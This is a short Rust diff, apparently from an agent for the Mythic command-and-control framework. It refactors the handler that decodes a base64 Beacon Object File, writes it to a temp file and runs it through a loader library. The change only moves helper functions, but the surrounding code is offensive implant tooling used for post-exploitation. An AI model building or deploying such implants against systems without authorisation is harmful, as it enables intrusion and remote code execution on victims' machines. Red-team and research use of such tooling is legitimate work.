@@ -21,6 +21,8 @@
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
+use crate::sys::encoding::{decode_b64, temp_path};
+
 // ── Params ──────────────────────────────────────────────────
 
 #[derive(Deserialize)]
@@ -59,15 +61,6 @@ const DEFAULT_LOADER_PATH: &str = "/tmp/nanaz_bof_loader.so";
 /// Signature: `void bof_load_run(char *bof_path, char *function, char *args, int args_len)`
 const LOADER_EXPORT: &str = "bof_load_run";
 
-// ── Base64 helper ───────────────────────────────────────────
-
-fn decode_b64(s: &str) -> Result<Vec<u8>, String> {
-    use base64::Engine;
-    base64::engine::general_purpose::STANDARD
-        .decode(s.trim())
-        .map_err(|e| format!("base64 decode failed: {e}"))
-}
-
 // ── Main handler ────────────────────────────────────────────
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
@@ -83,7 +76,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     };
 
     // 2. Write BOF to temp file
-    let bof_path = crate::tasks::run_dll::temp_path(&params.bof_name);
+    let bof_path = temp_path(&params.bof_name);
     if let Err(e) = std::fs::write(&bof_path, &bof_bytes) {
         return TaskResponse::failed(task.id, &format!("write BOF failed: {e}"));
     }
